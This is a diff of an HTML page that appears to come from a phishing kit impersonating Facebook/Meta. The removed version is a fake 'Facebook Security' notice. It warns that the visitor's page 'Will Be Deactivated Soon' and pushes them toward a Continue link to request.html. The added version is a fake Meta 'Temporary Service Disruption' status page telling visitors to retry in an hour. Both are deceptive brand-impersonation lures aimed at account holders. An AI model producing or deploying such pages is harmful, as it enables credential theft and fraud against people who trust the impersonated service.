@@ -1,175 +1,89 @@
-<html lang="en"><head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
-    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
-    <title>Facebook Warning</title>
-    <link rel="icon" type="image/png" href="Facebook_Logo_2023.png">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, Helvetica, sans-serif;
-        }
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Meta | Temporary Service Disruption</title>
+  <link rel="icon" href="d4ZIVX-5C-b.ico">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
-        html,
-        body {
-            height: 0%;
-            width: 100%;
-        }
+    body {
+      background: linear-gradient(135deg, #e6ecf5, #f5f7fa);
+      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #1c1e21;
+    }
 
-        #container {
-            height: 135%;
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background-color: #f0f2f5;
-        }
+    .card {
+      background-color: #ffffff;
+      border-radius: 16px;
+      padding: 40px;
+      width: 100%;
+      max-width: 440px;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.07);
+      animation: fadeIn 0.7s ease-in-out;
+    }
 
-        #box {
-            height: 40%;
-            width: 45%;
-            background-color: rgb(255, 255, 255);
-            border-radius: 3px;
-            display: flex;
-            align-items: center;
-            flex-direction: column;
-        }
+    .logo {
+      width: 90px;
+      margin-bottom: 20px;
+    }
 
-        #box>img {
-            width: 70px;
-            margin-top: 15px;
-        }
+    h1 {
+      font-size: 24px;
+      color: #1877f2;
+      margin-bottom: 10px;
+    }
 
-        #data {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-top: 15px;
-        }
+    p {
+      font-size: 16px;
+      color: #444950;
+      margin-top: 10px;
+      line-height: 1.5;
+    }
 
-        #data>h4 {
-            font-size: 25px;
-        }
+    .footer-note {
+      font-size: 13px;
+      color: #999;
+      margin-top: 25px;
+    }
 
-        #data>img {
-            width: 25px;
-        }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
 
-        .line {
-            height: .7px;
-            background-color: rgba(0, 0, 0, 0.222);
-            width: 90%;
-            margin: 1rem;
-        }
+    @media (max-width: 500px) {
+      .card {
+        padding: 30px 20px;
+      }
 
-        #para h2 {
-            font-size: 16px;
-        }
+      h1 {
+        font-size: 22px;
+      }
 
-        #para {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        #para p {
-            margin: 20px 100px 0px 100px;
-            font-size: 14px;
-        }
-
-        #para button {
-            padding: 10px 20px 10px 20px;
-            margin-top: 25px;
-            border: none;
-            border-radius: 2px;
-            font-size: 18px;
-            background-color: #145dbd;
-            cursor: pointer;
-        }
-
-        #para button a {
-            text-decoration: none;
-            color: #fff;
-        }
-
-        #para button:hover {
-            background-color: #03469e;
-        }
-
-        @media (max-width: 500px) {
-            #box {
-                margin: 0;
-                height: 45%;
-                width: 95%;
-                top: 0%;
-            }
-            #box>img {
-                width: 40px;
-            }
-            #data>h4 {
-                font-size: 18px;
-            }
-            #data>img {
-                width: 15px;
-                margin-left: 2px;
-            }
-            .line {
-                height: .5px;
-                width: 90%;
-                margin-left: auto;
-                margin-right: auto;
-                background-color: #00000045;
-            }
-            #para {
-                margin: 0%;
-            }
-            #para>h2 {
-                font-size: 12px;
-                font-weight: 700;
-                margin-bottom: 10px;
-            }
-            #para>p {
-                margin: 5px 15px 0px 15px;
-                font-size: 14px;
-            }
-            #para button {
-                padding: 8px 18px 8px 18px;
-                margin-top: 15px;
-                border: none;
-                border-radius: 2px;
-                font-size: 13px;
-                background-color: #1877F2;
-                cursor: pointer;
-            }
-        }
-    </style>
+      p {
+        font-size: 15px;
+      }
+    }
+  </style>
 </head>
-
 <body>
-    <div id="container">
-        <div id="box">
-            <img src="Facebook_Logo_2023.png" alt="">
-            <h5 id="groupSubHeader">Facebook Security</h5>
-            <div id="data">
-                <h4>Account Restrictions Service</h4> <img src="bluetick.png" alt="">
-            </div>
-            <div class="line"></div>
-            <div id="para">
-                <h2> Your Page Will Be Deactivated Soon</h2>
-                <p>𝐖𝐞 𝐖𝐢𝐥𝐥 𝐖𝐚𝐥𝐤 𝐘𝐨𝐮 𝐓𝐡𝐫𝐨𝐮𝐠𝐡 𝐒𝐞𝐯𝐞𝐫𝐚𝐥 𝐒𝐭𝐞𝐩𝐬 𝐭𝐨 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐚 𝐑𝐞𝐯𝐢𝐞𝐰 𝐘𝐨𝐮 𝐒𝐡𝐨𝐮𝐥𝐝 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞 𝐓𝐡𝐞𝐬𝐞 𝐒𝐭𝐞𝐩𝐬 𝐒𝐨 𝐓𝐡𝐚𝐭 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐖𝐢𝐥𝐥 𝐍𝐨𝐭 𝐃𝐞𝐥𝐞𝐭𝐞𝐝 𝐏𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲.
-                    </p>
-                <button> <a href="request.html">Continue</a> </button>
-            </div>
-        </div>
-    </div>
+  <div class="card">
+    
+    <h1>Temporary Service Unavailable</h1>
+    <p>We are currently addressing an unexpected issue
+affecting Meta services.</p>
+    <p>Please try again after<strong>Approximately 1 Hour.</strong>.</p>
+    <div class="footer-note">Thank you for your understanding<br> - Meta Platform Status</div>
+  </div>
 
 
-
-
-
-
-</body></html>
+</body></html
